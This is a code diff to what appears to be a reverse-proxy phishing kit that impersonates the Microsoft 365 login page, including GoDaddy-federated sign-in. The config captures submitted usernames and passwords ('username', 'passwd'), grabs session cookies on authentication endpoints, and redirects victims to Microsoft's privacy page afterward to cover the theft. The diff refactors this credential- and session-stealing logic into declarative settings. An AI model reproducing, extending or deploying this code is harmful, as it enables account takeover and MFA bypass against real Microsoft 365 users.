@@ -191,8 +191,6 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     execute(clientContext) {
 
 
-        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
-
 
         //TODO: needs update to this code
         if (this.req.url.startsWith('/redirect.cgi?ref=aHR0cHM6Ly93d3cub2ZmaWNlLmNvbS9sb2dpbiM=')) {
@@ -201,27 +199,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             return super.superExecuteProxy(clientContext.currentDomain, clientContext)
         }
 
-
-        if (this.req.method === 'POST') {
-           
-            if (this.req.url.startsWith('/common/GetCredentialType')) {
-                super.captureBody(clientContext.currentDomain, clientContext)
-
-            }else { 
-                super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            }
-        }
-        
-
-        if (this.req.url.startsWith('/auth-assets/')) {
-            return super.superExecuteProxy('img6.wsimg.com', clientContext)
-        }
-
        
-        if (this.req.url.startsWith('/v1/api')) {
-            // clientContext.currentDomain = 'sso.godaddy.com'
+        // if (this.req.url.startsWith('/v1/api')) {
+        //     // clientContext.currentDomain = 'sso.godaddy.com'
            
-        }
+        // }
 
         if (this.req.url.startsWith(`/${clientContext.hostname}`)) {
             clientContext.currentDomain = 'sso.godaddy.com'
@@ -230,35 +212,16 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             console.log('max url is ' + this.req.url)
         }
 
-        const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
+      
 
         if (this.req.url.startsWith('/:443')) {
             this.req.url = this.req.url.slice(5)
         }
 
-        if (this.req.url.startsWith('/common/reprocess') || this.req.url.startsWith('/common/SAS/ProcessAuth')) {
-            clientContext.setLogAvailable(true);
-            super.sendClientData(clientContext, {})
-        }
-
-        // if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
-        // || this.req.url.startsWith('/landingv2')) {
-        //     super.sendClientData(clientContext, {})
-
-        // }
-
+              
        
-        if (this.req.url === '/ping/v5767687') {
-            super.sendClientData(clientContext, {})
-            return super.exitLink('https://privacy.microsoft.com/en-us/privacystatement')
-        }
 
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+        return super.execute(clientContext)
 
     }
 }
@@ -269,36 +232,54 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 const configExport = {
     CURRENT_DOMAIN: 'login.microsoftonline.com',
 
+    SCHEME: 'office',
+
     AUTOGRAB_CODE: 'login_hint',
 
 
     START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
     
-    EXTERNAL_FILTERS: 
-        [
-        'login.live.com',
-        'aadcdn.msftauth.net',
-        'login.microsoftonline.com',
-        'sso.godaddy.com',
-        'godaddy.com'
-        ],
+    COOKIE_PATH: ['/common/reprocess', '/common/SAS/ProcessAuth', '/ping/v5767687'],
 
-    PRE_HANDLERS:
-        [
-        ],
+    EXIT_TRIGGER_PATH: ['/ping/v5767687'],
+
+    EXIT_URL: 'https://privacy.microsoft.com/en-us/privacystatement',
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/auth-assets/',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'img6.wsimg.com',
+                persistent: false,
+                },
+        },
+
+        {
+            path: '/common/GetCredentialType.*',
+            command: 'DONOT_SEND_INFO',
+            command_args: {},
+        },
+
+    ],
+
+    
+
+    PRE_HANDLERS:[],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
     CAPTURES: {
-        loginUserName: {
+        officeEmail: {
             method: 'POST',
             params: ['username'],
             urls: '',
             hosts: ['login.microsoftonline.com'],
         },
 
-        loginPassword: {
+        officePassword: {
             method: 'POST',
             params: ['passwd'],
             urls: '',
@@ -342,16 +323,27 @@ const configExport = {
             hosts: ['login.microsoftonline.com'],
         },
 
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
-
+       
     },
 
-    cookieKEY: 'loginUsername'
+    
+    EXTERNAL_FILTERS: 
+        [
+        // 'login.live.com',
+        'aadcdn.msftauth.net',
+        'login.microsoftonline.com',
+        'sso.godaddy.com',
+        'godaddy.com'
+        ],
+
+
+    //MODULE OPTIONS 
+    MODULE_ENABLED: true,
+
+    MODULE_OPTIONS: {
+        startPath: this.START_PATH,
+        exitLink: '',
+    },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
